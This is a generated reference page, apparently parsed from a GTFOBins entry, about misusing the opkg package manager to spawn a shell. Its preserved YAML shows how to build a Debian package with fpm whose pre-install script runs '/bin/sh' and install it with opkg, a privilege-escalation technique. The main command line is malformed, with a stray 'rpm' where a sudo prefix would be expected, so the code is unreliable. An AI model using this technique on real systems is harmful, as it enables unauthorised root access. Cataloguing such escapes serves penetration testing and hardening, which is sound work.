---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# opkg

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `opkg` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/opkg` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [opkg](../../tools/linux/opkg.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | opkg |
| name | opkg |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/opkg/ |

## Preserved Source Material

````yaml
_body: ''
_name: opkg
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/opkg
functions:
  shell:
  - code: rpm opkg install x_1.0_all.deb
    comment: 'Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.


      ```

      echo ''exec /bin/sh'' >x.sh

      fpm -n x -s dir -t deb -a all --before-install x.sh .

      ```'
    contexts:
      sudo: null
````
